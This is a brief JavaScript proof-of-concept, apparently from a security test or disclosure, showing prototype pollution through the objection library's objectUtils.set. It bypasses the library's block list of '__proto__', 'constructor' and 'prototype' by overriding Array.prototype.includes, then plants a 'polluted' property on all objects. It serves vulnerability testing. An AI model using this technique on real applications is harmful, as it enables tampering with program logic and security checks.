Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const objectUtils = require('objection/lib/utils/objectUtils');
console.log({}.polluted);
let obj = {};
objectUtils.set(obj, [
    '__proto__',
    'polluted'
], 'yes');
console.log({}.polluted);